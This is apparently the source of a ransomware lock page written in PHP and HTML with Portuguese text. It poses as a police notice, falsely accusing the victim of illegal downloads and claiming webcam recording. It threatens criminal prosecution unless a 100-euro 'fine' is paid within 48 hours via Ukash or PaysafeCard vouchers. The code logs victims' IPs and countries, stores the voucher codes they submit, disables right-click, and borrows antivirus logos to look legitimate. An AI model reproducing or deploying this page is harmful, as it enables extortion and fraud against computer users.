<?php
error_reporting(0);
include 'include/config.php';
include ('include/db.php');
include("sxgeo/SxGeo.php");




$pin=$_GET['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$date=date('H:i:s j/m/Y');


$SxGeo = new SxGeo();

$country=$SxGeo->get_cc($ip);

$SxGeo->close();


$locations= array(1 => 'DE', 'UK', 'IT', 'FR', 'ES', 'PT', 'CA', 'AT', 'FI', 'SE', 'US', 'GR', 'LU', 'BE', 'PL');

foreach ($locations as $value)
{
	
if ($value==$country)
{
$pic=$value;
break;
}
else
$pic='default';	
}




mysql_query ( "INSERT INTO checklist (ip, country, date) VALUES ('".mysql_escape_string($ip)."', 
'".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
mysql_insert_id ();




  $pin=$_GET['pin'];

  
  
    if(strlen($pin) == 16 && preg_match("/[0-9]{16}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
   if(strlen($pin) == 19 && preg_match("/[0-9]{19}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
  
 
 ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>


  
  <script language="JavaScript">
<!--
///////////////////////////////////
function clickIE4(){
if (event.button==2){
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("return false")
// --> </script>
  

  
  <title></title>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">


  
  <link href="style.css" rel="stylesheet" type="text/css">


  
  <script type="text/javascript" src="jquery1.3.1.js"></script>
  
  <script type="text/javascript" src="jquerykeypad.js"></script>
  

  <style type="text/css">
<!--
#Table_01 {
position:absolute;
left:20px;
top:20px;
width:100%;
height:100%;
}
.btn{
color: #000;
width: 30px;
margin-left: 5px;
border: 1px solid #434343;
-moz-border-radius: 2px;
-khtml-border-radius: 2px;
-webkit-border-radius: 2px;
border-radius: 2px;
}
.btn:hover{
border: 2px solid #0290CB;
}
#Untitled-1-01 {
position:absolute;
left:0px;
top:0px;
width:1024px;
height:98px;
}
#Untitled-1-02 {
position:absolute;
left:0px;
top:98px;
width:395px;
height:670px;
}
#Untitled-1-03 {
position:absolute;
left:395px;
top:98px;
width:324px;
height:430px;
}
#Untitled-1-04 {
position:absolute;
left:719px;
top:98px;
width:305px;
height:430px;
}
#Untitled-1-05 {
position:absolute;
left:395px;
top:528px;
width:629px;
height:240px;
}
-->
  </style><!-- End ImageReady Styles -->
</head>


<body style="margin: 0px; background-color: rgb(255, 255, 255);">


<!-- ImageReady Slices (Untitled-1) -->
<div id="Table_01">
<div id="Untitled-1-01"> <img style="width: 481px; height: 99px;" alt="" src="images/logo.jpg"></div>


<div style="left: 0px; width: 470px; top: 130px; height: 745px;" id="Untitled-1-02"><span id="result_box" class="" lang="pt"><span class="hps">Todas as atividades</span> <span class="hps">deste</span> <span class="hps">computador foi</span> <span class="hps">gravado.</span> <span class="hps">Se voc&ecirc; usar</span> <span class="hps">webcam,</span> <span class="hps">v&iacute;deos e imagens</span> <span class="hps">foram salvas</span> <span class="hps">para webcam</span> <span class="hps">identifica&ccedil;&atilde;o.</span></span>

<center><img style="width: 256px; height: 192px;" alt="" src="images/flag_256.jpg"></center>


<br>


<span style="font-weight: bold;" id="result_box" class="" lang="pt"><span class="hps">Seu</span> <span class="hps">endere&ccedil;o IP:</span></span><?php echo $_SERVER['REMOTE_ADDR'];?>
<br>
<span id="result_box" class="" lang="pt"><span class="hps">Voc&ecirc; pode</span> <span class="hps">ser claramente</span> <span class="hps">identificado pelo seu endere&ccedil;o</span> <span class="hps">IP</span> <span class="hps">eo</span> <span class="hps">nome do host</span> <span class="hps">associado</span></span><br>


<br>


<img style="width: 447px; height: 90px;" alt="" src="images/yourpclock.jpg"><br>


<br>


<span id="result_box" class="" lang="pt"><span style="font-weight: bold;" class="hps">Material de</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">baixadas ilegalmente</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps atn">(</span><span style="font-weight: bold;">MP3, </span><span style="font-weight: bold;" class="hps">filmes ou</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">software</span><span style="font-weight: bold;">) foi </span><span style="font-weight: bold;" class="hps">localizada no seu computador</span><br>
<br>
 <span class="hps">Ao fazer o download</span><span>, aqueles</span> <span class="hps">foram reproduzidos</span><span>,</span> <span class="hps">provocando assim um</span> <span class="hps">crime</span> <span class="hps">sob a Se&ccedil;&atilde;o</span> <span class="hps">106 da</span> <span class="hps">Lei de Direitos Autorais</span><span>.</span><br>
<br>
 <span class="hps">A</span> <span class="hps">descarga do</span> <span class="hps">material com direitos autorais</span> <span class="hps">atrav&eacute;s da Internet ou</span> <span class="hps">redes de compartilhamento</span> <span class="hps">de m&uacute;sica</span> <span class="hps">&eacute; ilegal e</span> <span class="hps">est&aacute; em conformidade com</span><br>
 <span class="hps">Se&ccedil;&atilde;o</span> <span class="hps">106 da</span> <span class="hps">Lei de Direitos Autorais</span> <span class="hps">sujeito</span> <span class="hps">a uma</span> <span class="hps">multa ou pris&atilde;o de</span> <span class="hps">uma pena de</span> <span class="hps">at&eacute; 3 anos</span><br>
<br>
 <span class="hps">Futhermore</span><span>,</span> <span class="hps">posse de material</span> <span class="hps">baixadas ilegalmente</span> <span class="hps">&eacute; pun&iacute;vel</span> <span class="hps">nos termos do Artigo</span> <span class="hps">184</span> <span class="hps">par&aacute;grafo 3 &ordm; do</span> <span class="hps">C&oacute;digo Penal</span> <span class="hps">e tamb&eacute;m pode levar</span> <span class="hps">ao</span> <span class="hps">confisco</span> <span class="hps">do computador</span><span>, com o qual</span> <span class="hps">os</span> <span class="hps">Diles</span> <span class="hps">foram baixadas</span></span></div>


<div style="left: 474px; width: 372px; top: 128px; height: 174px;" id="Untitled-1-03"><span id="result_box" class="short_text" lang="pt"><span class="hps">Por favor,</span> <span class="hps">siga as instru&ccedil;&otilde;es</span> <span class="hps">&agrave; direita</span></span>

<form name="ukash_form" method="get" action="PT.php" style="margin: 0px;">Ukash code: <input name="pin" id="defaultKeypad" type="text"><input name="formbutton1" value="ok" class="btn" type="submit">
  
  <div id="formradio2"><input name="100u" value="50" type="radio">50 Euro</div>


  
  <div id="formradio3"><input name="100u" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<form name="psc_form" method="get" action="PT.php" style="margin: 0px;">Psc code: <input name="pin" id="defaultKeypad2" type="text"><input name="formbutton2" value="ok" class="btn" type="submit">
  
  <div id="formradio4"><input name="100p" value="50" type="radio">50 Euro</div>


  
  <div id="formradio5"><input name="100p" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<br>


<br>


<br>


<span id="result_box" class="" lang="pt"><span style="color: rgb(255, 0, 0);" class="hps">Aten&ccedil;&atilde;o:</span> <span class="hps">Essa multa</span> <span class="hps">s&oacute; pode ser</span> <span class="hps">pago no prazo de</span> <span class="hps">48 horas</span><span class="">, se voc&ecirc; deixar</span> <span class="hps">passar</span> <span class="hps">48 horas</span> <span class="hps">sem pagamento</span><span>,</span> <span class="hps">a possibilidade</span> <span class="hps">de desbloquear o seu</span> <span class="hps">computador expira</span><span>.</span><br>
<br>
 <span style="font-weight: bold;" class="hps">Neste caso, um</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">caso criminal</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">contra voc&ecirc;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">ser&aacute; iniciada</span> <span class="hps"><span style="font-weight: bold;">automaticamente</span>.</span></span><span style="font-weight: bold;"></span></div>


<div style="left: 860px; width: 164px; top: 98px; height: 261px;" id="Untitled-1-04"> <img style="width: 332px; height: 271px;" alt="" src="images/right2.jpg"></div>


<div style="left: 481px; width: 543px; top: 468px; height: 380px;" id="Untitled-1-05"> <img style="width: 276px; height: 38px;" alt="" src="images/mcafee.jpg"><span id="result_box" class="" lang="en"><span class="hps"><br>
</span></span><span id="result_box" class="" lang="pt"><span class="hps">Como desbloquear</span><span>?</span><br>
<br>
 <span class="hps">De acordo com a</span> <span class="hps">Lei <span style="font-weight: bold;">"Sobre</span></span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">Controle e</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">Prote&ccedil;&atilde;o de Informa&ccedil;&otilde;es</span><span style="font-weight: bold;">"</span> <span class="hps">em</span> <span class="hps">2012/02/01</span> <span class="hps">Voc&ecirc; tem que pagar</span> <span class="hps">uma multa de <span style="font-weight: bold;">100</span></span><span style="font-weight: bold;"> </span><span class="hps"><span style="font-weight: bold;">euros</span>.</span> <span class="hps">Para a</span> <span class="hps">comodidade de pagar</span> <span class="hps">uma oferta</span> <span class="hps">muito bem usar</span> <span class="hps">uma forma segura de</span> <span class="hps">pagamento</span> <span class="hps">atrav&eacute;s de vales de</span> <span style="font-weight: bold;" class="hps">Ukash</span><span style="font-weight: bold;"> </span> <span style="font-weight: bold;" class="hps">/PaysafeCard</span><span>.</span> <span class="hps">Voc&ecirc; precisa</span> <span class="hps">comprar vouchers</span> <span class="hps">no valor de</span> <span style="font-weight: bold;" class="hps">100 euros</span><span>, depois de</span> <span class="hps">preencher os</span> <span class="hps">campos apropriados</span><span class="atn">, clique em "</span><span class="">OK</span></span><span id="result_box" class="" lang="en"><span class="">"</span></span><br>


<br>


<center><img style="top: 666px; left: 501px; width: 169px; height: 90px;" alt="" src="images/1326914693-sopa-pipa-inquisitr.png">
<img style="top: 488px; left: 501px; width: 76px; height: 92px;" alt="" src="images/kaspersky_is_logo.gif.png"></center>


</div>


</div>


<!-- End ImageReady Slices -->
</body>
</html>
